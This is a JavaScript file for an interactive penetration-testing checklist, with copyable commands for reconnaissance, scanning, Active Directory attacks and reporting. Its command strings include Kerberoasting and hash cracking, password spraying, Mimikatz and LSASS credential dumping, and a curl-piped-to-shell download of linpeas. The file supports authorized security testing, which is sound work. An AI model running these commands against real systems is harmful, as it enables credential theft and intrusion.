/**
 * tools/penguide.js
 * Interactive cybersecurity analyst pentest checklist.
 * Organized by engagement phase. Checkbox state saved to localStorage.
 * Commands are copyable with one click.
 *
 * Export: startTool(container)
 */

const STORAGE_KEY = 'secureos_penguide_v1';

// ── Checklist data ────────────────────────────────────────────────────────────

const PHASES = [
  {
    id: 'recon',
    title: '01 · RECONNAISSANCE',
    items: [
      {
        id: 'r1',
        text: 'Passive OSINT — target profiling',
        cmd: 'theHarvester -d target.com -b all -f recon_out\nmaltego (GUI) — target domain / company name',
        note: 'Gather emails, subdomains, employees, tech stack from public sources. No active contact with target.',
      },
      {
        id: 'r2',
        text: 'Shodan / Censys — internet exposure',
        cmd: 'shodan search org:"Target Inc" --fields ip_str,port,hostnames\ncensys search target.com',
        note: 'Find exposed services, open ports, SSL cert info, banners. Often reveals forgotten infrastructure.',
      },
      {
        id: 'r3',
        text: 'DNS enumeration & zone transfer',
        cmd: 'dnsrecon -d target.com -t axfr\nsublist3r -d target.com -o subdomains.txt\namass enum -d target.com',
        note: 'Find subdomains, try DNS zone transfer (AXFR). Misconfigured DNS servers leak the full zone.',
      },
      {
        id: 'r4',
        text: 'Google dorking — sensitive file exposure',
        cmd: 'site:target.com filetype:pdf OR filetype:xls OR filetype:doc\nsite:target.com inurl:admin OR inurl:login OR inurl:config\nsite:target.com "password" OR "credentials" OR "internal"',
        note: 'Google Advanced Operators find sensitive docs, login pages, exposed configs indexed by search engines.',
      },
      {
        id: 'r5',
        text: 'LinkedIn / social engineering risk',
        cmd: '# Map org structure: employees, roles, technology keywords in profiles\n# Look for: IT staff, sysadmins, recent job postings (reveals tech stack)\n# Tools: LinkedInt, linkedin2username',
        note: 'LinkedIn reveals internal technology, team structure, and potential phishing targets.',
      },
    ],
  },
  {
    id: 'scan',
    title: '02 · NETWORK SCANNING',
    items: [
      {
        id: 's1',
        text: 'Host discovery — live host identification',
        cmd: 'nmap -sn 192.168.1.0/24 -oN hosts_alive.txt\nnmap -sn -PE -PP -PM 192.168.1.0/24',
        note: 'Identify live hosts before full port scan. Faster and stealthier than scanning dead IPs.',
      },
      {
        id: 's2',
        text: 'Full TCP port scan — save to XML & TXT',
        cmd: 'nmap -sV -sC -p- -T4 192.168.1.0/24 \\\n  -oX nmap_full.xml \\\n  -oN nmap_full.txt \\\n  --open',
        note: 'All 65535 TCP ports. -sV=version detection, -sC=default scripts. XML → import into Nessus/OpenVAS. -T4 = aggressive timing (use -T3 if IDS evasion needed).',
      },
      {
        id: 's3',
        text: 'UDP scan — top services',
        cmd: 'nmap -sU --top-ports 200 -T4 192.168.1.0/24 -oN nmap_udp.txt',
        note: 'UDP: DNS(53), SNMP(161), NTP(123), TFTP(69), DHCP(67/68) often overlooked. SNMP community strings can expose entire configs.',
      },
      {
        id: 's4',
        text: 'OS detection & aggressive scan',
        cmd: 'nmap -A -O --osscan-guess 192.168.1.0/24 -oN nmap_aggressive.txt',
        note: '-A = OS detect + version + scripts + traceroute. Use on specific hosts after discovering live ones.',
      },
      {
        id: 's5',
        text: 'SMB / NetBIOS enumeration',
        cmd: 'nmap --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p 445 192.168.1.0/24\nenum4linux -a 192.168.1.X\ncrackmapexec smb 192.168.1.0/24',
        note: 'Check for open shares, null sessions, EternalBlue (MS17-010). Null session = no creds needed.',
      },
      {
        id: 's6',
        text: 'SNMP enumeration',
        cmd: 'nmap -sU -p 161 --script snmp-info,snmp-sysdescr 192.168.1.0/24\nonesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24\nsnmpwalk -v2c -c public 192.168.1.X',
        note: 'SNMP "public" community string is default and often left unchanged. Can dump entire routing table, interface list, and more.',
      },
    ],
  },
  {
    id: 'vuln',
    title: '03 · VULNERABILITY ASSESSMENT',
    items: [
      {
        id: 'v1',
        text: 'Import nmap XML into Nessus or OpenVAS',
        cmd: '# NESSUS:\n#   Settings → Scans → Import → upload nmap_full.xml\n#   Create new scan using imported hosts\n\n# OPENVAS:\n#   Configuration → Targets → New Target\n#   Hosts: import from file → upload nmap_full.xml',
        note: 'Pre-populate the scanner with confirmed live hosts + service info from nmap. Saves scan time.',
      },
      {
        id: 'v2',
        text: 'Run authenticated vulnerability scan',
        cmd: '# Add credentials in scan settings:\n#   Windows: domain\\user / password (SMB)\n#   Linux: SSH keypair or password\n#   Databases: service account credentials\n\n# Authenticated scans find 3–5× more vulnerabilities than unauthenticated.',
        note: 'Credentialed scans log into each host and inspect installed software, patch levels, config files. Essential for accuracy.',
      },
      {
        id: 'v3',
        text: 'Triage findings by CVSS score',
        cmd: '# Priority order:\n#   CRITICAL  (CVSS 9.0–10.0) → exploit within 24h if possible\n#   HIGH      (CVSS 7.0–8.9)  → schedule within 1 week\n#   MEDIUM    (CVSS 4.0–6.9)  → schedule within 1 month\n#   LOW/INFO  (< 4.0)         → backlog\n\n# ALWAYS manually verify top findings — false positives are common.',
        note: 'Scanners generate false positives. Verify critical/high findings manually before including in report.',
      },
      {
        id: 'v4',
        text: 'Cross-reference CVEs with exploits',
        cmd: 'searchsploit <service> <version>\nsearchsploit --cve CVE-2021-44228\n\n# In msfconsole:\nsearch type:exploit name:eternalblue\nsearch cve:2021-44228',
        note: 'Check if public exploits exist for discovered vulnerabilities. Proof-of-concept = automatic critical severity bump.',
      },
      {
        id: 'v5',
        text: 'Check for missing patches / EOL software',
        cmd: '# Windows: wmic qfe list brief | findstr KB\n# Linux: apt list --upgradable 2>/dev/null\n# Check EOL: endoflife.date (website)\n# Nessus plugin: "Unsupported Operating System"',
        note: 'End-of-life OS (Windows 7/Server 2008) and unpatched software are the most common critical findings.',
      },
    ],
  },
  {
    id: 'ad',
    title: '04 · ACTIVE DIRECTORY',
    items: [
      {
        id: 'a1',
        text: 'PingCastle — AD health & risk score',
        cmd: 'PingCastle.exe --healthcheck --server domain.local\n\n# Output: HTML report with risk score (0-100)\n# Score breakdown: Stale Objects, Privileged Accounts, Trusts, Anomalies\n# Score > 70 = critical risks present',
        note: 'Run first — gives a fast risk overview the client can understand. Score benchmarks against 1400+ companies.',
      },
      {
        id: 'a2',
        text: 'BloodHound — attack path visualization',
        cmd: '# Collection (from domain machine or with creds):\nSharpHound.exe -c All -d domain.local --outputdirectory C:\\Temp\n\n# Or remotely with Python:\npython3 bloodhound.py -u user -p pass -d domain.local -c All -ns DC_IP\n\n# Import ZIP into BloodHound GUI\n# Key queries: "Shortest Paths to Domain Admins"',
        note: 'BloodHound maps every ACL relationship in AD. Often reveals non-obvious paths from low-priv user → Domain Admin.',
      },
      {
        id: 'a3',
        text: 'Kerberoasting — SPN account cracking',
        cmd: 'GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request -outputfile kerberoast.hash\n\nhashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force\nhashcat -m 13100 kerberoast.hash -a 3 ?u?l?l?l?d?d?d?d?s',
        note: 'Service accounts often have weak passwords and never expire. Offline attack — no account lockout risk.',
      },
      {
        id: 'a4',
        text: 'AS-REP Roasting — no-preauth accounts',
        cmd: 'GetNPUsers.py domain/ -no-pass -usersfile users.txt -dc-ip DC_IP -outputfile asrep.hash\n\nhashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt',
        note: 'Accounts with "Do not require Kerberos preauthentication" leak crackable TGT hashes without authentication.',
      },
      {
        id: 'a5',
        text: 'Password spray — check lockout first!',
        cmd: '# BEFORE spraying — check lockout policy:\nnet accounts /domain\nGet-ADDefaultDomainPasswordPolicy | Select LockoutThreshold,LockoutObservationWindow\n\n# Spray (1 attempt / 30 min to stay safe):\ncrackmapexec smb DC_IP -u users.txt -p "Spring2024!" --continue-on-success\nkerbrute passwordspray -d domain.local --dc DC_IP users.txt "Spring2024!"',
        note: '⚠ CRITICAL: exceeding lockout threshold locks out ALL tested accounts — DoS on production users. Always check policy first.',
      },
      {
        id: 'a6',
        text: 'LDAP enumeration & user description mining',
        cmd: 'ldapdomaindump -u "domain\\user" -p pass DC_IP -o ldap_dump/\n\n# PowerView (on domain host):\nGet-DomainUser | select samaccountname,description,memberof | Where-Object {$_.description -ne $null}\n\n# Look for passwords stored in description fields!',
        note: 'Description fields frequently contain plaintext passwords, set by admins years ago and forgotten. Very common finding.',
      },
      {
        id: 'a7',
        text: 'ACL / DACL misconfigurations',
        cmd: '# BloodHound → Queries → "Find Principals with DCSync Rights"\n# BloodHound → Queries → "Find Dangerous Rights for Domain Users"\n\n# Manual check with PowerView:\nFind-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users"}',
        note: 'Weak ACLs (WriteDACL, GenericAll on accounts) allow privilege escalation without exploiting any CVE.',
      },
    ],
  },
  {
    id: 'web',
    title: '05 · WEB APPLICATION',
    items: [
      {
        id: 'w1',
        text: 'Nikto — web server quick scan',
        cmd: 'nikto -h https://target.com -o nikto.txt -Format txt\nnikto -h https://target.com -Tuning 9 -o nikto_xss.txt',
        note: 'Fast check for known vulnerabilities, default files, server misconfigurations. Not stealthy — generates lots of logs.',
      },
      {
        id: 'w2',
        text: 'Directory & endpoint enumeration',
        cmd: '# gobuster:\ngobuster dir -u https://target.com -w /usr/share/wordlists/dirb/big.txt \\\n  -x php,asp,aspx,jsp,txt,bak -o gobuster.txt\n\n# ffuf:\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403\n\n# feroxbuster (recursive):\nferoxbuster -u https://target.com -w wordlist.txt --depth 3',
        note: 'Find hidden admin panels, backup files (.bak, .old), config files, unlinked API endpoints.',
      },
      {
        id: 'w3',
        text: 'SSL/TLS configuration',
        cmd: 'testssl.sh https://target.com --htmlfile ssl_report.html\nnmap --script ssl-enum-ciphers -p 443 target.com\nslyss ssl --target target.com:443',
        note: 'Check for: weak ciphers (RC4, 3DES), TLS 1.0/1.1, expired certs, POODLE/BEAST/CRIME/BREACH, HSTS missing.',
      },
      {
        id: 'w4',
        text: 'OWASP ZAP active scan',
        cmd: '# GUI: Target → Active Scan → choose scan policy\n\n# CLI headless:\nzap-cli quick-scan --self-contained -l Medium https://target.com\nzap.sh -daemon -port 8090 -config api.disablekey=true',
        note: 'Automated OWASP Top 10 coverage. Review alerts by risk level. ZAP misses ~40% of issues — supplement with manual testing.',
      },
      {
        id: 'w5',
        text: 'Manual OWASP Top 10 review',
        cmd: '# A01 Broken Access Control: test IDOR (change IDs in URLs/requests)\n# A02 Crypto Failures: HTTP? Sensitive data in URL? Weak JWT?\n# A03 Injection: SQLi in inputs, XSS in reflected params, RCE in file uploads\n# A04 Insecure Design: business logic (skip steps, negative quantities)\n# A05 Security Misconfiguration: default creds, verbose errors, directory listing\n# A06 Vulnerable Components: check package versions vs CVE databases\n# A07 Auth Failures: brute force, session fixation, weak reset flow\n# A08 Integrity Failures: check update mechanisms, serialization\n# A09 Logging: trigger errors — do they appear in response? Insufficient logging\n# A10 SSRF: test URL parameters for internal network access',
        note: 'Manual testing is essential — automated scanners miss business logic, auth issues, and chained vulnerabilities.',
      },
    ],
  },
  {
    id: 'post',
    title: '06 · POST-EXPLOITATION  (authorized scope only)',
    items: [
      {
        id: 'p1',
        text: 'Local privilege escalation — automated',
        cmd: '# Windows:\n.\\winPEASx64.exe > winpeas_out.txt 2>&1\npowerup.ps1; Invoke-AllChecks\n\n# Linux:\ncurl https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee linpeas.txt\nsudo -l   # check sudo permissions\nfind / -perm -4000 2>/dev/null  # SUID binaries',
        note: 'Look for: unquoted service paths, writable services, scheduled tasks running as SYSTEM, weak file permissions.',
      },
      {
        id: 'p2',
        text: 'Lateral movement path mapping',
        cmd: '# SMB reachability from current host:\ncrackmapexec smb 192.168.1.0/24 -u user -p pass --shares\n\n# RDP:\ncrackmapexec rdp 192.168.1.0/24 -u user -p pass\n\n# BloodHound: "Shortest Paths from Owned Principals" after marking compromised nodes',
        note: 'Document every system reachable with harvested credentials. Map the blast radius of a single compromised account.',
      },
      {
        id: 'p3',
        text: 'Credential harvesting (Windows)',
        cmd: '# Mimikatz (needs SYSTEM):\nPrivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::dcsync /domain:domain.local /all\n\n# LSASS dump (stealthier):\nTask Manager → lsass.exe → Create dump → transfer and parse offline',
        note: '⚠ Written authorization required. Document all credentials found — do NOT use outside agreed scope. Treat as highly sensitive.',
      },
    ],
  },
  {
    id: 'report',
    title: '07 · REPORTING',
    items: [
      {
        id: 'rp1',
        text: 'Screenshot & document all findings',
        cmd: '# Each finding needs:\n# - Affected host(s) / IP / URL\n# - Screenshot of the vulnerability / exploit output\n# - Step-by-step reproduction steps\n# - CVSS score (use nvd.nist.gov/vuln-metrics/cvss)\n# - Timestamp (include in screenshot where possible)',
        note: 'Evidence must be independently reproducible by a third party. Vague findings get disputed and closed without fixes.',
      },
      {
        id: 'rp2',
        text: 'CVSS scoring for every finding',
        cmd: '# Use: first.org/cvss/calculator (CVSS v3.1)\n#\n# Score ranges:\n#   CRITICAL 9.0–10.0 — patch immediately, escalate to CISO\n#   HIGH     7.0–8.9  — patch within 30 days\n#   MEDIUM   4.0–6.9  — patch within 90 days\n#   LOW      0.1–3.9  — backlog / risk accepted\n#   INFO     0.0      — best practice / observation',
        note: 'Be accurate — over-inflating scores damages credibility. Under-inflating lets critical issues slip through. When in doubt, score conservatively.',
      },
      {
        id: 'rp3',
        text: 'Executive summary (non-technical)',
        cmd: '# Structure (max 1 page):\n# 1. Engagement overview (scope, dates, methodology)\n# 2. Overall risk rating (Critical/High/Medium/Low)\n# 3. Top 3 critical findings — business impact only (no CVE numbers)\n# 4. Positive findings (what they do well)\n# 5. Recommended immediate actions (3–5 bullet points)\n\n# Audience: C-level, non-technical. No jargon.',
        note: 'The executive summary is often the ONLY section leadership reads. Write it to drive action, not to show your technical knowledge.',
      },
      {
        id: 'rp4',
        text: 'Technical findings (per vulnerability)',
        cmd: '# Finding template:\n# Title          : [Severity] Short descriptive title\n# CVSS Score     : X.X (Vector: CVSS:3.1/AV:N/AC:L/...)\n# Affected Host  : IP / hostname / URL\n# Description    : What the vulnerability is\n# Proof of Concept: Step-by-step + screenshots\n# Business Impact: What an attacker could do\n# Remediation    : Specific fix with reference (vendor advisory / CIS benchmark)\n# Retest Date    : [agreed date]\n\n# Order: Critical → High → Medium → Low → Informational',
        note: 'Each remediation must be specific and actionable. "Apply security patches" is not actionable — "Apply KB5034441 (Jan 2024 Patch Tuesday)" is.',
      },
      {
        id: 'rp5',
        text: 'Remediation verification & retest',
        cmd: '# Schedule retest 30–60 days after report delivery\n# For each finding:\n#   1. Ask client for evidence of fix (changelog, config diff, update log)\n#   2. Re-run specific test that confirmed the finding originally\n#   3. Mark as "Remediated", "Partially Remediated", or "Risk Accepted"\n\n# Update report with retest results and new risk rating',
        note: 'A finding is only CLOSED when independently verified by you. Client saying "we fixed it" is not verification.',
      },
      {
        id: 'rp6',
        text: 'Final review checklist',
        cmd: '# Before delivery:\n# [ ] All findings have CVSS scores\n# [ ] All findings have remediation steps\n# [ ] Executive summary is non-technical\n# [ ] No client data / screenshots beyond scope in report\n# [ ] Report is encrypted before emailing (PDF password or PGP)\n# [ ] Destroy/return test credentials, access tokens, and harvested data\n# [ ] Sign off on data handling according to NDA / engagement contract',
        note: 'Data handling after engagement is a legal obligation. Pentest reports contain highly sensitive data — treat accordingly.',
      },
    ],
  },
];

// ── State ─────────────────────────────────────────────────────────────────────

function loadState() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch { return {}; }
}

function saveState(state) {
  try { localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); } catch {}
}

// ── DOM helpers ───────────────────────────────────────────────────────────────

function el(tag, cls = '', text = '') {
  const e = document.createElement(tag);
  if (cls)  e.className = cls;
  if (text) e.textContent = text;
  return e;
}

// ── Tool entry point ──────────────────────────────────────────────────────────

export function startTool(container) {
  container.style.display       = 'flex';
  container.style.flexDirection = 'column';

  let state = loadState();

  // ─ Header bar ─
  const headerBar = el('div', 'pc-tool-section');
  headerBar.style.cssText = 'flex-shrink:0;display:flex;align-items:center;gap:0.8rem;flex-wrap:wrap;';

  const progress = el('span', 'pc-tool-value');
  progress.style.fontWeight = 'bold';

  const resetBtn = el('button', 'pc-tool-btn', '[ RESET ALL ]');
  resetBtn.style.marginLeft = 'auto';

  headerBar.append(progress, resetBtn);
  container.appendChild(headerBar);

  // ─ Scrollable content ─
  const scroll = el('div');
  scroll.style.cssText = 'flex:1;overflow-y:auto;';
  container.appendChild(scroll);

  // ─ Update progress ─
  function updateProgress() {
    const total   = PHASES.reduce((n, p) => n + p.items.length, 0);
    const checked = PHASES.reduce((n, p) => n + p.items.filter(i => state[i.id]).length, 0);
    const pct     = Math.round((checked / total) * 100);
    const filled  = Math.round((checked / total) * 20);
    const bar     = '█'.repeat(filled) + '░'.repeat(20 - filled);
    progress.textContent = `[${bar}]  ${checked}/${total}  (${pct}%)`;
  }

  // ─ Render phases ─
  function render() {
    scroll.innerHTML = '';
    updateProgress();

    PHASES.forEach(phase => {
      const phaseDiv = el('div', 'pc-tool-section');

      const phaseHdr = el('div', 'pc-tool-header', phase.title);
      const phaseChecked = phase.items.filter(i => state[i.id]).length;
      const phaseBadge   = el('span', phaseChecked === phase.items.length ? 'pc-tool-success' : 'pc-tool-dim');
      phaseBadge.style.cssText = 'font-size:0.75em;margin-left:0.5rem;font-weight:normal;';
      phaseBadge.textContent   = `${phaseChecked}/${phase.items.length}`;
      phaseHdr.appendChild(phaseBadge);
      phaseDiv.appendChild(phaseHdr);

      phase.items.forEach(item => {
        const itemDiv = el('div');
        itemDiv.style.cssText = 'margin-bottom:0.55rem;border-left:2px solid rgba(0,255,65,0.12);padding-left:0.6rem;';

        // Checkbox row
        const checkRow = el('div');
        checkRow.style.cssText = 'display:flex;align-items:flex-start;gap:0.5rem;cursor:pointer;';

        const checkbox = el('span');
        checkbox.style.cssText = 'font-size:0.85em;flex-shrink:0;margin-top:0.05em;user-select:none;min-width:1.4em;';
        checkbox.textContent   = state[item.id] ? '[X]' : '[ ]';

        const label = el('span', state[item.id] ? 'pc-tool-dim' : 'pc-tool-value');
        label.style.cssText  = `font-size:0.85em;font-weight:bold;${state[item.id] ? 'text-decoration:line-through;opacity:0.6;' : ''}`;
        label.textContent    = item.text;

        checkRow.append(checkbox, label);

        checkRow.addEventListener('click', () => {
          state[item.id] = !state[item.id];
          saveState(state);
          // Update just this item's checkbox and label instead of full re-render
          checkbox.textContent = state[item.id] ? '[X]' : '[ ]';
          label.className      = state[item.id] ? 'pc-tool-dim' : 'pc-tool-value';
          label.style.textDecoration = state[item.id] ? 'line-through' : 'none';
          label.style.opacity        = state[item.id] ? '0.6' : '1';
          itemDiv.style.borderLeftColor = state[item.id] ? 'rgba(0,255,65,0.45)' : 'rgba(0,255,65,0.12)';
          updateProgress();
        });

        // Mark completed items
        if (state[item.id]) {
          itemDiv.style.borderLeftColor = 'rgba(0,255,65,0.45)';
        }

        itemDiv.appendChild(checkRow);

        // Note
        if (item.note) {
          const noteEl = el('div', 'pc-tool-dim');
          noteEl.style.cssText = 'font-size:0.72em;margin:0.1rem 0 0.2rem 1.9rem;line-height:1.4;';
          noteEl.textContent   = item.note;
          itemDiv.appendChild(noteEl);
        }

        // Command block (copyable)
        if (item.cmd) {
          const cmdWrap = el('div');
          cmdWrap.style.cssText = 'margin:0.2rem 0 0 1.9rem;';

          const cmdLabel = el('div', 'pc-tool-dim');
          cmdLabel.style.cssText = 'font-size:0.68em;margin-bottom:0.1rem;';
          cmdLabel.textContent   = '▶ COMMAND (click to copy):';

          const cmdBlock = el('div', 'pc-tool-mono');
          cmdBlock.style.cssText = 'font-size:0.72em;white-space:pre-wrap;word-break:break-all;cursor:pointer;padding:0.25rem 0.4rem;';
          cmdBlock.textContent   = item.cmd;
          cmdBlock.title         = 'Click to copy command';

          cmdBlock.addEventListener('click', () => {
            navigator.clipboard.writeText(item.cmd).catch(() => {});
            const prev = cmdBlock.textContent;
            cmdBlock.textContent = '✓  Copied to clipboard!';
            setTimeout(() => { cmdBlock.textContent = prev; }, 1400);
          });

          cmdWrap.append(cmdLabel, cmdBlock);
          itemDiv.appendChild(cmdWrap);
        }

        phaseDiv.appendChild(itemDiv);
      });

      scroll.appendChild(phaseDiv);
    });
  }

  // ─ Reset ─
  resetBtn.addEventListener('click', () => {
    state = {};
    saveState(state);
    render();
  });

  render();
}
